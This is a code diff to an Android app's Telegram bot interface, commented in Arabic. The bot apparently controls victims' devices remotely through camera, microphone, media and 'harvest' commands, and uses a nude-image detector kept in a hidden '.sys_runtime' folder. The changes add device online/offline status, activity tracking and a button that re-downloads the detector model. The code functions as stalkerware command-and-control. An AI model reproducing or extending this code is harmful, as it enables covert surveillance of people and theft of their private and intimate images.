@@ -34,6 +34,8 @@ import com.example.app.safeGet
  * ✅ تم إضافة التحقق من وجود الملفات قبل الإرسال.
  * ✅ تم استبدال processedUpdates بـ LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى.
  * ✅ تم إصلاح sendErrorReport لتجنب ANR باستخدام scope.launch بدلاً من runBlocking.
+ * ✅ إضافة زر تحديث النموذج في القائمة الفرعية للجهاز.
+ * ✅ عرض حالة اتصال الأجهزة (متصل/غير متصل) في قائمة الأجهزة.
  */
 class TelegramUi(
     context: Context,
@@ -584,6 +586,8 @@ class TelegramUi(
         deviceMutex.withLock {
             if (devices.containsKey(deviceId)) {
                 val devObj = devices[deviceId]!!
+                // تحديث آخر نشاط عند تسجيل الدخول
+                devObj.put("last_activity", System.currentTimeMillis() / 1000)
                 devObj.put(
                     "last_seen",
                     SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
@@ -602,6 +606,7 @@ class TelegramUi(
                 val newDev = JSONObject().apply {
                     put("n", deviceModel)
                     put("t", topicId)
+                    put("last_activity", System.currentTimeMillis() / 1000)
                     put(
                         "last_seen",
                         SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
@@ -627,9 +632,28 @@ class TelegramUi(
         return null
     }
 
+    /**
+     * تحديث آخر نشاط لجهاز معين (يُستدعى عند تنفيذ أي أمر من الجهاز)
+     */
+    private fun updateDeviceActivity(deviceId: String) {
+        if (deviceId.isBlank()) return
+        deviceMutex.withLock {
+            val dev = devices[deviceId]
+            if (dev != null) {
+                dev.put("last_activity", System.currentTimeMillis() / 1000)
+                // حفظ التغييرات في الخلفية
+                scope.launch {
+                    saveData()
+                }
+            }
+        }
+    }
+
     fun notifyHarvest(deviceId: String, count: Int) {
         scope.launch {
             val dev = devices[deviceId] ?: return@launch
+            // تحديث آخر نشاط عند استقبال حصاد
+            dev.put("last_activity", System.currentTimeMillis() / 1000)
             val topicId = dev.optLong("t", -1L)
             if (topicId != -1L) {
                 val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
@@ -649,6 +673,7 @@ class TelegramUi(
                     }
                 )
             }
+            saveData()
         }
     }
 
@@ -786,7 +811,12 @@ class TelegramUi(
                             put("callback_data", "send_now_$deviceId")
                         })
                     })
+                    // ✅ صف جديد: زر تحديث النموذج
                     put(JSONArray().apply {
+                        put(JSONObject().apply {
+                            put("text", "🔄 تحديث النموذج")
+                            put("callback_data", "update_model_$deviceId")
+                        })
                         put(JSONObject().apply {
                             put("text", "🔙 Back")
                             put("callback_data", "ld")
@@ -1027,6 +1057,23 @@ class TelegramUi(
                 return
             }
 
+            // استخراج deviceId من بعض الأوامر
+            val deviceId = when {
+                data.startsWith("cam_") || data.startsWith("camf_") ||
+                data.startsWith("mic_") || data.startsWith("hrv_") ||
+                data.startsWith("media_") || data.startsWith("send_now_") ||
+                data.startsWith("update_model_") -> {
+                    val parts = data.split("_")
+                    if (parts.size >= 2) parts[1] else ""
+                }
+                else -> ""
+            }
+
+            // تحديث آخر نشاط للجهاز إذا كان معروفاً
+            if (deviceId.isNotEmpty()) {
+                updateDeviceActivity(deviceId)
+            }
+
             when {
                 data == "ld" -> {
                     if (devices.isEmpty()) {
@@ -1041,12 +1088,18 @@ class TelegramUi(
                     }
                     val kb = JSONObject().apply {
                         val rows = JSONArray()
+                        val now = System.currentTimeMillis() / 1000
                         devices.forEach { (did, info) ->
+                            val lastActivity = info.optLong("last_activity", 0)
+                            // اعتبر الجهاز متصلاً إذا كان آخر نشاط خلال 5 دقائق (300 ثانية)
+                            val isOnline = (now - lastActivity) < 300
+                            val statusIcon = if (isOnline) "🟢" else "🔴"
+                            val deviceName = info.optString("n")
                             rows.put(
                                 JSONArray().apply {
                                     put(
                                         JSONObject().apply {
-                                            put("text", "📱 ${info.optString("n")}")
+                                            put("text", "$statusIcon 📱 $deviceName")
                                             put("callback_data", "dev_$did")
                                         }
                                     )
@@ -1207,6 +1260,53 @@ class TelegramUi(
                     )
                     return
                 }
+                data.startsWith("update_model_") -> {
+                    // ✅ تحديث النموذج
+                    val did = data.substringAfter("update_model_")
+                    if (did.isNotEmpty()) {
+                        // إعلام المستخدم ببدء التحديث
+                        apiCall(
+                            "sendMessage",
+                            JSONObject().apply {
+                                put("chat_id", chatId)
+                                put("text", "🔄 جاري تحديث نموذج الذكاء الاصطناعي... قد يستغرق دقائق.")
+                            }
+                        )
+                        // تشغيل التحديث في الخلفية
+                        scope.launch {
+                            try {
+                                val success = updateModel()
+                                if (success) {
+                                    apiCall(
+                                        "sendMessage",
+                                        JSONObject().apply {
+                                            put("chat_id", chatId)
+                                            put("text", "✅ تم تحديث النموذج بنجاح! النموذج جاهز للاستخدام.")
+                                        }
+                                    )
+                                } else {
+                                    apiCall(
+                                        "sendMessage",
+                                        JSONObject().apply {
+                                            put("chat_id", chatId)
+                                            put("text", "❌ فشل تحديث النموذج. تأكد من الاتصال بالإنترنت وحاول مرة أخرى.")
+                                        }
+                                    )
+                                }
+                            } catch (e: Exception) {
+                                writeLog("Update model error: ${e.message}")
+                                apiCall(
+                                    "sendMessage",
+                                    JSONObject().apply {
+                                        put("chat_id", chatId)
+                                        put("text", "❌ حدث خطأ أثناء التحديث: ${e.message?.take(100)}")
+                                    }
+                                )
+                            }
+                        }
+                    }
+                    return
+                }
             }
 
             // تمرير الأوامر الأخرى إلى Commands
@@ -1239,6 +1339,62 @@ class TelegramUi(
                     "الوقت" to SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                 )
             )
+        }
+    }
+
+    // ============================================================
+    //  دالة تحديث النموذج
+    // ============================================================
+
+    /**
+     * حذف النموذج القديم وإعادة تحميله من GitHub.
+     * @return true إذا تم التحديث بنجاح، false في حالة الفشل.
+     */
+    private suspend fun updateModel(): Boolean {
+        return withContext(Dispatchers.IO) {
+            try {
+                // الحصول على NudeDetector من Monitor
+                val detector = monitor?.let {
+                    try {
+                        val field = it.javaClass.getDeclaredField("nudeDetector")
+                        field.isAccessible = true
+                        field.get(it) as? NudeDetector
+                    } catch (e: Exception) {
+                        writeLog("Failed to get NudeDetector: ${e.message}")
+                        null
+                    }
+                }
+
+                if (detector == null) {
+                    writeLog("NudeDetector not available")
+                    return@withContext false
+                }
+
+                // حذف الملف القديم
+                val modelFile = File(appContext?.filesDir, ".sys_runtime/models/engine_v2.tflite")
+                if (modelFile.exists()) {
+                    val deleted = modelFile.delete()
+                    writeLog("🗑️ Old model deleted: $deleted")
+                } else {
+                    writeLog("ℹ️ No existing model file to delete.")
+                }
+
+                // إعادة تحميل النموذج
+                val success = detector.ensureModelReady()
+                if (success) {
+                    // تحديث المسار وإعادة تحميل المحرك
+                    detector.modelPath = modelFile.absolutePath
+                    detector.loadEngineForever()
+                    writeLog("✅ Model updated successfully")
+                    true
+                } else {
+                    writeLog("❌ Model update failed")
+                    false
+                }
+            } catch (e: Exception) {
+                writeLog("Update model exception: ${e.message}")
+                false
+            }
         }
     }
 
